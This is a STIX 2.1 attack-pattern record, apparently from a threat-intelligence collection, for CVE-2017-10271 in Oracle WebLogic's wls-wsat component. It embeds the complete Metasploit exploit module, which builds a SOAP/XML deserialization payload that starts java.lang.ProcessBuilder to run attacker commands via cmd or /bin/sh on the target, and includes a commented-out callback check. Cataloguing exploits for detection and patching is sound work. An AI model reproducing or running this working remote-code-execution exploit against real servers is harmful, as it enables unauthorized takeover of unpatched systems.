{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b26352f-0344-4a6a-a07e-f4499b0b866d",
    "created": "2024-08-14T17:07:32.140589Z",
    "modified": "2024-08-14T17:07:32.140593Z",
    "name": "Oracle WebLogic wls-wsat Component Deserialization RCE",
    "description": "( The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization remote code execution vulnerability. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Discovered by Alexey Tyurin of ERPScan and Federico Dotta of Media Service. Please note that SRVHOST, SRVPORT HTTP_DELAY, URIPATH and related HTTP Server variables are only used when executing a check and will not be used when executing the exploit itself. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/oracle_weblogic_wsat_deserialization_rce.rb",
            "external_id": "oracle_weblogic_wsat_deserialization_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-10271"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  # include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Oracle WebLogic wls-wsat Component Deserialization RCE',\n        'Description'    => %q(\n            The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization\n        remote code execution vulnerability. Supported versions that are affected are\n        10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Discovered by Alexey Tyurin\n        of ERPScan and Federico Dotta of Media Service. Please note that SRVHOST, SRVPORT,\n        HTTP_DELAY, URIPATH and related HTTP Server variables are only used when executing a check\n        and will not be used when executing the exploit itself.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Kevin Kirsche <d3c3pt10n[AT]deceiveyour.team>', # Metasploit module\n          'Luffin', # Proof of Concept\n          'Alexey Tyurin', 'Federico Dotta' # Vulnerability Discovery\n        ],\n        'References'     =>\n          [\n            ['URL', 'https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html'], # Security Bulletin\n            ['URL', 'https://github.com/Luffin/CVE-2017-10271'], # Proof-of-Concept\n            ['URL', 'https://github.com/kkirsche/CVE-2017-10271'], # Standalone Exploit\n            ['CVE', '2017-10271'],\n            ['EDB', '43458']\n          ],\n        'Platform'      => %w{ win unix },\n        'Arch'          => [ ARCH_CMD ],\n        'Targets'        =>\n          [\n            [ 'Windows Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'win' } ],\n            [ 'Unix Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ]\n          ],\n        'DisclosureDate' => '2017-10-19',\n        # Note that this is by index, rather than name. It's generally easiest\n        # just to put the default at the beginning of the list and skip this\n        # entirely.\n        'DefaultTarget'  => 0\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to the WebLogic WSAT endpoint', '/wls-wsat/CoordinatorPortType']),\n      OptPort.new('RPORT', [true, \"The remote port that the WebLogic WSAT endpoint listens on\", 7001]),\n      OptFloat.new('TIMEOUT', [true, \"The timeout value of requests to RHOST\", 20.0]),\n      # OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the check payload', 10])\n    ])\n  end\n\n  def cmd_base\n    if target['Platform'] == 'win'\n      return 'cmd'\n    else\n      return '/bin/sh'\n    end\n  end\n\n  def cmd_opt\n    if target['Platform'] == 'win'\n      return '/c'\n    else\n      return '-c'\n    end\n  end\n\n\n  #\n  # This generates a XML payload that will execute the desired payload on the RHOST\n  #\n  def exploit_process_builder_payload\n    # Generate a payload which will execute on a *nix machine using /bin/sh\n    xml = %Q{<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java>\n        <void class=\"java.lang.ProcessBuilder\">\n          <array class=\"java.lang.String\" length=\"3\" >\n            <void index=\"0\">\n              <string>#{cmd_base}</string>\n            </void>\n            <void index=\"1\">\n              <string>#{cmd_opt}</string>\n            </void>\n            <void index=\"2\">\n              <string>#{payload.encoded.encode(xml: :text)}</string>\n            </void>\n          </array>\n          <void method=\"start\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>}\n  end\n\n  #\n  # This builds a XML payload that will generate a HTTP GET request to our SRVHOST\n  # from the target machine.\n  #\n  def check_process_builder_payload\n    xml = %Q{<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\n        <void id=\"url\" class=\"java.net.URL\">\n          <string>#{get_uri.encode(xml: :text)}</string>\n        </void>\n        <void idref=\"url\">\n          <void id=\"stream\" method = \"openStream\" />\n        </void>\n      </java>\n    </work:WorkContext>\n    </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>}\n  end\n\n  #\n  # In the event that a 'check' host responds, we should respond randomly so that we don't clog up\n  # the logs too much with a no response error or similar.\n  #\n  def on_request_uri(cli, request)\n    random_content = '<html><head></head><body><p>'+Rex::Text.rand_text_alphanumeric(20)+'<p></body></html>'\n    send_response(cli, random_content)\n\n    @received_request = true\n  end\n\n  #\n  # The exploit method connects to the remote service and sends a randomly generated string\n  # encapsulated within a SOAP XML body. This will start an HTTP server for us to receive\n  # the response from. This is based off of the exploit technique from\n  # exploits/windows/novell/netiq_pum_eval.rb\n  #\n  # This doesn't work as is because MSF cannot mix HttpServer and HttpClient\n  # at the time of authoring this\n  #\n  # def check\n  #   start_service\n  #\n  #   print_status('Sending the check payload...')\n  #   res = send_request_cgi({\n  #     'method'   => 'POST',\n  #     'uri'      => normalize_uri(target_uri.path),\n  #     'data'     => check_process_builder_payload,\n  #     'ctype'    => 'text/xml;charset=UTF-8'\n  #   }, datastore['TIMEOUT'])\n  #\n  #   print_status(\"Waiting #{datastore['HTTP_DELAY']} seconds to see if the target requests our URI...\")\n  #\n  #   waited = 0\n  #   until @received_request\n  #     sleep 1\n  #     waited += 1\n  #     if waited > datastore['HTTP_DELAY']\n  #       cleanup_service\n  #       return Exploit::CheckCode::Safe\n  #     end\n  #   end\n  #\n  #   cleanup_service\n  #   return Exploit::CheckCode::Vulnerable\n  # end\n\n  #\n  # The exploit method connects to the remote service and sends the specified payload\n  # encapsulated within a SOAP XML body.\n  #\n  def exploit\n    send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path),\n      'data'     => exploit_process_builder_payload,\n      'ctype'    => 'text/xml;charset=UTF-8'\n    }, datastore['TIMEOUT'])\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-19",
    "x_mitre_platforms": [
        "%w{ win unix }"
    ]
}